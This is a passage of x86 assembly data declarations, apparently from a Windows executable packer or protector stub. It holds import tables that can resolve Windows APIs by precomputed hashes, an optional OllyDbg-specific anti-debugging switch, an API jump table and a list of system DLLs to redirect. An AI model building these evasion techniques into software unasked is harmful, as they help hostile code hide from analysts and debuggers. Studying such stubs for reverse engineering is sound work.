	_tls_dwCharacteristics:			dd(0xCCCCCCCC)
	
	; relocation table storage(DO NOT MOVE)
	dwRelocVa:				dd(0xCCCCCCCC) 
							db(0x00)
	
	; internal import name table
%ifdef use_api_names
	szLoadLibrary:		db "LoadLibraryA", 0
	szGetProcAddr:		db "GetProcAddress", 0
	szVirtualProtect:	db "VirtualProtect", 0
	szVirtualAlloc:		db "VirtualAlloc", 0
%ifdef use_olly_specific_anti_dbg
	szOutputDbgString:	db "OutputDebugStringA", 0
%endif
%elif use_api_hashes
	szLoadLibrary:		dd 0ec0e4e8eh
	szGetProcAddr:		dd 07c0dfcaah
	szVirtualProtect:	dd 07946c61bh
	szVirtualAlloc:		dd 091afca54h
%ifdef use_olly_specific_anti_dbg
	szOutputDbgString:	dd 0470d22bch
%endif
%else
	%error "Please specifiy a form of API resolution", 0
%endif

	; internal address table
	pLoadLibrary:			dd(0xFFFFFFFF)
	pGetProcAddress:		dd(0xFFFFFFFF)
	pVirtualProtect:		dd(0xFFFFFFFF)
	pVirtualAlloc			dd(0xFFFFFFFF)
%ifdef use_olly_specific_anti_dbg
	pOutputDbgString:		dd(0xFFFFFFFF)
	pGetLastError:			dd(0xFFFFFFFF)
%endif

	; internal API JMP table
	__jmpLoadLibrary:			__jmp_api 
										dd(0xFFFFFFFF)
	__jmpGetProcAddress:		__jmp_api 
										dd(0xFFFFFFFF)
	__jmpVirtualProtect:		__jmp_api 
										dd(0xFFFFFFFF)
	__jmpVirtualAlloc:			__jmp_api 
										dd(0xFFFFFFFF)
%ifdef use_olly_specific_anti_dbg
	__jmpOutputDebugString:
									__jmp_api 
										dd(0xFFFFFFFF)
%endif
	
	; list of DLL's to redirect	
	szDllRedirectionList:
		db "KERNEL32.DLL", 0
		db "USER32.DLL", 0
		db "GDI32.DLL", 0
		db "ADVAPI32.DLL", 0
		db "SHELL32.DLL", 0
		db "COMCTL32.DLL", 0
		dd(0x00000000)
	